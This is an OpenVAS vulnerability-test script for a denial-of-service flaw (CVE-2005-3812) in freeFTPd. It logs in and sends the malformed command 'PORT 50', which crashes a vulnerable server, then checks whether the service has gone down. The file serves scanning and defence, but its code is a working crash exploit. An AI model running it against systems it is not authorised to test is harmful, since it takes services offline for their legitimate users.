###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freeftpd_port_cmd_dos_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# freeFTPD PORT Command Denial of Service Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802913");
  script_version("$Revision: 11857 $");
  script_cve_id("CVE-2005-3812");
  script_bugtraq_id(15557);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-07-13 14:06:29 +0530 (Fri, 13 Jul 2012)");
  script_name("freeFTPD PORT Command Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://secunia.com/advisories/17737");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/1339/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/417602");

  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to crash an affected server,
  effectively denying service to legitimate users.");
  script_tag(name:"affected", value:"freeFTPd version 1.0.10 and prior");
  script_tag(name:"insight", value:"A NULL pointer dereferencing error exists when parsing the parameter of the
  PORT command. Logged on user can send a port command appended with some
  numbers to crash the server.");
  script_tag(name:"solution", value:"Upgrade to freeFTPd version 1.0.11 or later.");
  script_tag(name:"summary", value:"This host is running FreeFTPD Server and is prone to denial of
  service vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.freesshd.com/?ctt=download");
  exit(0);
}


include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(!get_port_state(ftpPort)){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

## Accept the banner and
banner = recv(socket:soc, length:512);
if("I'm freeFTPd" >!< banner)
{
  ftp_close(socket:soc);
  exit(0);
}

user = get_kb_item("ftp/login");
if(! user){
  user = "anonymous";
}

pass = get_kb_item("ftp/password");
if(! pass){
  pass = "anonymous";
}

login_details = ftp_authenticate(socket:soc, user:user, pass:pass);
if(!login_details)
{
  ftp_close(socket:soc);
  exit(0);
}

data = "PORT 50";

## Send the crafted data
ftp_send_cmd(socket:soc, cmd:data);
ftp_close(socket:soc);

soc2 = open_sock_tcp(ftpPort);
if(!soc2)
{
  security_message(ftpPort);
  exit(0);
}

## Some time server will be listening, but won't respond
banner =  recv(socket:soc2, length:512);
if("I'm freeFTPd" >!< banner)
{
  ftp_close(socket:soc2);
  security_message(ftpPort);
  exit(0);
}
ftp_close(socket:soc2);
